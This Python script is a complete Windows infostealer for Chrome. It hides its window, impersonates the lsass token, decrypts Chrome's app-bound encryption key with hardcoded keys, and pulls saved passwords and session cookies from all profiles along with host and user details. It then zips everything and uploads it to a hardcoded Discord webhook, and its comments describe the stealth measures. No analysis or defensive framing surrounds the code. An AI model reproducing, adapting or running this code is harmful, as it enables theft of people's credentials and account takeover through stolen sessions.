import os
import io
import sys
import shutil
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
import tempfile
import subprocess
import socket
import getpass
import winreg
import zipfile
from contextlib import contextmanager
from datetime import datetime

import requests
import windows
import windows.crypto
import windows.generated_def as gdef

from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

# ================= DISCORD WEBHOOK =================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1505507550840225852/kjSyAiaYu9Rvbsv-wwzchwzIQGb2nt_WjiKF9j1GMjs6rFu3Yd9qZV98HpPXpslwHwMw"
# ===================================================

def hide_console():
    """Hide the current console window if it exists."""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except:
        pass

def suppress_windows_error_dialogs():
    """Prevent system error message boxes (e.g., crashes, missing DLLs)."""
    try:
        # SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX
        ctypes.windll.kernel32.SetErrorMode(0x8001 | 0x0002 | 0x8000)
    except:
        pass

def redirect_output_to_nul():
    """Send all print/error output to nowhere."""
    nul = open(os.devnull, 'w')
    sys.stdout = nul
    sys.stderr = nul

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def kill_chrome():
    """Terminate Chrome to release database locks"""
    try:
        subprocess.run(["taskkill", "/f", "/im", "chrome.exe"],
                       capture_output=True, check=False)
    except:
        pass

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    parsed_data['flag'] = buffer.read(1)[0]
    if parsed_data['flag'] in (1, 2):
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")
    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0
    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(
        hKey, input_buffer, len(input_buffer), None, None, 0,
        ctypes.byref(pcbResult), 0x40
    )
    assert status == 0
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    status = ncrypt.NCryptDecrypt(
        hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
        ctypes.byref(pcbResult), 0x40
    )
    assert status == 0
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AESGCM(aes_key)
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20Poly1305(chacha20_key)
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AESGCM(xored_aes_key)
    else:
        raise ValueError("Invalid flag")
    return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)

def decrypt_password_v20(cipher, encrypted_value: bytes) -> str:
    """Decrypt v20 encrypted password"""
    try:
        if not encrypted_value or encrypted_value[:3] != b'v20':
            return ""
        iv = encrypted_value[3:3+12]
        tag = encrypted_value[-16:]
        ciphertext = encrypted_value[3+12:-16]
        plain = cipher.decrypt(iv, ciphertext + tag, None)
        return plain.decode('utf-8', errors='replace')
    except:
        return ""

def decrypt_cookie_v20(cipher, encrypted_value: bytes) -> str:
    """Decrypt v20 encrypted cookie"""
    try:
        if not encrypted_value or encrypted_value[:3] != b'v20':
            return ""
        iv = encrypted_value[3:15]
        tag = encrypted_value[-16:]
        ciphertext = encrypted_value[15:-16]
        decrypted = cipher.decrypt(iv, ciphertext + tag, None)
        value = decrypted[32:].decode('utf-8', errors='replace')
        return value
    except:
        return ""

def get_chrome_profiles(user_data_path):
    """Return list of profile directory names"""
    profiles = []
    default_path = os.path.join(user_data_path, "Default", "Login Data")
    if os.path.exists(default_path):
        profiles.append("Default")
    for entry in os.listdir(user_data_path):
        if entry.startswith("Profile ") and entry[8:].isdigit():
            profile_path = os.path.join(user_data_path, entry, "Login Data")
            if os.path.exists(profile_path):
                profiles.append(entry)
    return profiles

def get_victim_info():
    """Get comprehensive victim device information"""
    try:
        hostname = socket.gethostname()
        username = getpass.getuser()
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                 r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            os_name = winreg.QueryValueEx(key, "ProductName")[0]
            build = winreg.QueryValueEx(key, "CurrentBuild")[0]
            winreg.CloseKey(key)
        except:
            os_name = "Windows"
            build = "Unknown"
        try:
            local_ip = socket.gethostbyname(hostname)
        except:
            local_ip = "Unknown"
        chrome_version = "Unknown"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Google\Chrome\BLBeacon")
            chrome_version = winreg.QueryValueEx(key, "version")[0]
            winreg.CloseKey(key)
        except:
            pass
        return {
            "hostname": hostname,
            "username": username,
            "os": os_name,
            "build": build,
            "local_ip": local_ip,
            "chrome_version": chrome_version,
            "admin": is_admin()
        }
    except:
        return {"error": "Failed to gather victim info"}

def extract_all_passwords(chrome_user_data, cipher, profiles):
    """Extract passwords from all Chrome profiles"""
    all_passwords = []
    total_passwords = 0
    for profile in profiles:
        login_db_path = os.path.join(chrome_user_data, profile, "Login Data")
        if not os.path.exists(login_db_path):
            continue
        profile_passwords = []
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_db_path = os.path.join(temp_dir, f"TempLoginData_{profile}")
            try:
                shutil.copy2(login_db_path, temp_db_path)
            except PermissionError:
                continue
            con = sqlite3.connect(pathlib.Path(temp_db_path).as_uri() + "?mode=ro", uri=True)
            cur = con.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL")
            rows = cur.fetchall()
            con.close()
            for url, username, enc_pass in rows:
                if enc_pass and len(enc_pass) > 3 and enc_pass[:3] == b'v20':
                    try:
                        password = decrypt_password_v20(cipher, enc_pass)
                        if password:
                            profile_passwords.append({
                                "url": url,
                                "username": username,
                                "password": password
                            })
                            total_passwords += 1
                    except:
                        pass
        if profile_passwords:
            all_passwords.append({
                "profile": profile,
                "passwords": profile_passwords,
                "count": len(profile_passwords)
            })
    return all_passwords, total_passwords

def extract_all_cookies(chrome_user_data, cipher):
    """Extract cookies from Chrome Default profile"""
    cookie_db_path = os.path.join(chrome_user_data, "Default", "Network", "Cookies")
    if not os.path.exists(cookie_db_path):
        return [], 0
    all_cookies = []
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_db_path = os.path.join(temp_dir, "TempCookies")
        try:
            shutil.copy2(cookie_db_path, temp_db_path)
        except PermissionError:
            return [], 0
        con = sqlite3.connect(pathlib.Path(temp_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies")
        rows = cur.fetchall()
        con.close()
        for host, name, enc_val in rows:
            if enc_val and len(enc_val) > 3 and enc_val[:3] == b"v20":
                value = decrypt_cookie_v20(cipher, enc_val)
                if value:
                    all_cookies.append({
                        "host": host,
                        "name": name,
                        "value": value
                    })
    return all_cookies, len(all_cookies)

def create_zip_with_files(passwords_data, cookies_data, victim_info):
    """Create a ZIP file containing both JSON files"""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        zip_filename = f"chrome_data_{victim_info['hostname']}_{victim_info['username']}_{timestamp}.zip"
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            if passwords_data and sum(p["count"] for p in passwords_data) > 0:
                passwords_json = json.dumps({
                    "victim": victim_info,
                    "extraction_date": datetime.now().isoformat(),
                    "passwords": passwords_data,
                    "total_passwords": sum(p["count"] for p in passwords_data)
                }, indent=2)
                zip_file.writestr(f"passwords_{timestamp}.json", passwords_json)
            if cookies_data and len(cookies_data) > 0:
                cookies_json = json.dumps({
                    "victim": victim_info,
                    "extraction_date": datetime.now().isoformat(),
                    "cookies": cookies_data,
                    "total_cookies": len(cookies_data)
                }, indent=2)
                zip_file.writestr(f"cookies_{timestamp}.json", cookies_json)
            info_text = f"""
Chrome Data Extraction Report
=============================
Victim: {victim_info['hostname']}\\{victim_info['username']}
OS: {victim_info['os']} (Build {victim_info['build']})
IP: {victim_info['local_ip']}
Chrome Version: {victim_info['chrome_version']}
Extraction Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Passwords: {sum(p["count"] for p in passwords_data)}
Cookies: {len(cookies_data)}
            """
            zip_file.writestr(f"info_{timestamp}.txt", info_text)
        return zip_buffer.getvalue(), zip_filename
    except:
        return None, None

def send_zip_to_discord(zip_data, zip_filename, victim_info, total_passwords, total_cookies):
    """Send ZIP file to Discord"""
    try:
        message = f"**📦 CHROME DATA EXTRACTED - COMPLETE ARCHIVE**\n\n```\n"
        message += f"💻 Hostname: {victim_info['hostname']}\n"
        message += f"👤 Username: {victim_info['username']}\n"
        message += f"🖥️ OS: {victim_info['os']} (Build {victim_info['build']})\n"
        message += f"📡 IP: {victim_info['local_ip']}\n"
        message += f"🌐 Chrome: {victim_info['chrome_version']}\n"
        message += f"🔧 Admin: {victim_info['admin']}\n"
        message += f"📊 Passwords: {total_passwords}\n"
        message += f"🍪 Cookies: {total_cookies}\n"
        message += f"📦 File: {zip_filename}\n"
        message += f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n```\n"
        message += "**📎 Complete data archive attached below**\n"
        message += "**Contains:** passwords.json + cookies.json + info.txt"
        files = {'file': (zip_filename, zip_data, 'application/zip')}
        payload = {'content': message}
        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files, timeout=120)
        return response.status_code in [200, 204]
    except:
        return False

def main():
    # ---- STEALTH MEASURES ----
    hide_console()                # Remove visible console window
    suppress_windows_error_dialogs()
    redirect_output_to_nul()      # Mute all prints

    if not is_admin():
        # Not admin – silently exit
        return

    kill_chrome()
    victim_info = get_victim_info()

    chrome_user_data = rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data"
    local_state_path = os.path.join(chrome_user_data, "Local State")
    if not os.path.exists(local_state_path):
        return

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
        assert binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB"
        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        v20_master_key = derive_v20_master_key(parsed_data)
        cipher = AESGCM(v20_master_key)

        profiles = get_chrome_profiles(chrome_user_data)
        passwords_data, total_passwords = extract_all_passwords(chrome_user_data, cipher, profiles)
        cookies_data, total_cookies = extract_all_cookies(chrome_user_data, cipher)

        if total_passwords > 0 or total_cookies > 0:
            zip_data, zip_filename = create_zip_with_files(passwords_data, cookies_data, victim_info)
            if zip_data:
                send_zip_to_discord(zip_data, zip_filename, victim_info, total_passwords, total_cookies)
    except:
        # Silently ignore all errors for stealth
        pass

if __name__ == "__main__":
    main()
